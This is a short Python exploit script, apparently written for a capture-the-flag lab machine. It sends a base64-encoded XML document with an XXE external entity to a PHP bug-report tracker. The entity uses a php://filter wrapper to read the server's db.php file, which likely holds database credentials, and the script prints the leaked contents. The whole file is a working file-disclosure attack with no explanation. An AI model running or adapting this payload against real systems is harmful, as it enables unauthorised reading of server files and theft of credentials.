#!/usr/bin/python3
import requests
import base64

url = "http://10.10.11.100/tracker_diRbPr00f314.php"
vuln =( 
    "<!DOCTYPE results [<!ENTITY harmless"
    " SYSTEM \"php://filter/read=convert.base64-encode/resource=db.php\">]>"
)

data = f"<?xml  version=\"1.0\" encoding=\"ISO-8859-1\"?>\n{vuln}\n\t\t<bugreport>\n\t\t<title>&harmless;</title>\n\t\t<cwe>test</cwe>\n\t\t<cvss>test</cvss>\n\t\t<reward>test</reward>\n\t\t</bugreport>"
payload = {"data": base64.b64encode(data.encode())}
print(payload)
print(requests.post(url,data=payload ).text)
